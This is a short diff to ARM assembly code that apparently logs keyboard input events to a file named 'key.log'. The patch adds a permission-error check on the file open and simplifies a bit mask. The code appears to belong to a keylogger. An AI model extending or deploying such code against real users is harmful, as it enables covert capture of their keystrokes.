@@ -17,6 +17,10 @@ _start:
         SWI #0
         MOV R12, R0
 
+	LDR R1, =0xFFFFFFF3
+	CMP R0, R1
+	BEQ error
+
 loop:
 	@ get next input event
         MOV R7, #3
@@ -28,8 +32,7 @@ loop:
 	@ save input type
         LDR R0, =input_event
         LDR R0, [R0, #8]
-        MOV R1, #0xFF00
-        ORR R1, R1, #0xFF
+        LDR R1, =0xFFFF
         AND R0, R0, R1
 
 	@ skip if input type == 0
@@ -120,6 +123,14 @@ write:
 _end:
         MOV R7, #1
         SWI #0
+
+error:
+	MOV R7, #4
+	MOV R0, #2
+	LDR R1, =errMsg
+	LDR R2, =lenErrMsg
+	SWI #0
+	B _end
 
 .section .data
         dest: .asciz "key.log"
